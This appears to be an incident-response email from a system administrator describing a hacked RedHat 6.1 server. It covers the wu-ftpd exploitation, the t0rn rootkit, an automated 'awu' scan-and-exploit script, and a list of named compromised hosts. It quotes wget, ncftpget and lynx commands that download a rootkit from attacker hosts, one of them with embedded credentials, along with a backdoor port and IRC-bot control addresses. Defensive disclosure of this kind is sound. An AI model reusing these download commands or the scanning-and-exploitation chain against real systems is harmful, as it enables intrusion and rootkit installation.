Re: SECURITY: hacked machines

The following is a forensic analysis of macaulay.math.uiuc.edu, a RedHat
6.1 machine that was recently hacked.  You are receiving this message
because I believe a machine under your control was also hacked.

Initial scan of macaulay:
Port       State       Service
22/tcp     open        ssh
23/tcp     open        telnet
25/tcp     open        smtp
79/tcp     open        finger
113/tcp    open        auth
513/tcp    open        login
514/tcp    open        shell
It had previously also been running wu-ftpd:
220 macaulay.math.uiuc.edu FTP server (Version wu-2.6.0(1) Thu Oct 21 12:27:00 EDT 1999) ready.

Preliminary work shows that macaulay was compromised around 09:03 Feb 4.
Lots of files were trojaned (including ps and ls); many left with uid/gid
1042/1037.  The hacker returned at about 17:30 Feb 4 and initiated a
scanning program in /.../awu/.

awu (auto-wu) was made in 2002 by riksta of [OPTIC]
Compiled on this machine on Feb 4 17:45, so most likely required human
interaction.  (The t0rn rootkit was installed automatically at 9:04.)

There the file 128 shows that all of 128.11-128.254 was to be scanned,
basically by calling awu repeatedly.
The file awu is a shell script that does the following:
 - runs pscan2 on a class B network looking for answers on port 21
 - runs ssvuln on machines that answered to get the ftp banner message
 - runs oops on the outfile (exploits each machine in turn)

It found a list of 1313 potentially-vulnerable machines.  Of those,
it appears to have successfully infected the following machines:
  128.42.57.153 paprika.mems.rice.edu
  128.61.36.113 r36h113.res.gatech.edu
  128.82.226.65 modestus.cee.odu.edu
  128.83.143.50 boniperti.csres.utexas.edu
  128.83.143.78 nlp01.csres.utexas.edu
The owners can verify that their machines were compromised by checking
for a backdoor listening on port 12321.

Attacked machines are automatically rooted by downloading the rootkit
by one of the following means:
  /usr/bin/wget http://136.176.52.62/rk.tgz
  /usr/bin/ncftpget ftp://maaiman:gokvcvz3@128.210.138.107/rk.tgz
  /usr/bin/lynx -dump http://136.176.52.62/rk.tgz >> rk.tgz
Since these machines are distributing a rootkit for automated
installation, it is critical that they be shut down quickly.

~spiroff/.cl/ had eggdrop in it, and a crontab to keep it running.
Running eggdrop (and sniffing the traffic) we see that it tries to
connect to the following four IP.port combinations:
  128.210.078.012.24120		capital.polsci.purdue.edu
  193.145.098.212.24121		molec2.dfis.ull.es
  209.052.174.131.24122		secure.ocis.net
  209.113.133.180.24123		chef.coptechinc.com
Ordinarily one would expect an eggdrop to connect to port 6667(irc),
so the fact that these are connecting to other high-numbered ports
(that are consecutive!) indicates these machines are also hacked.
Indeed, each is running a vulnerable FTP.

I strongly suggest a complete reinstall of any affected machines.  If
you have any questions about this incident, or need help in cleaning
up your systems, please feel free to contact me.
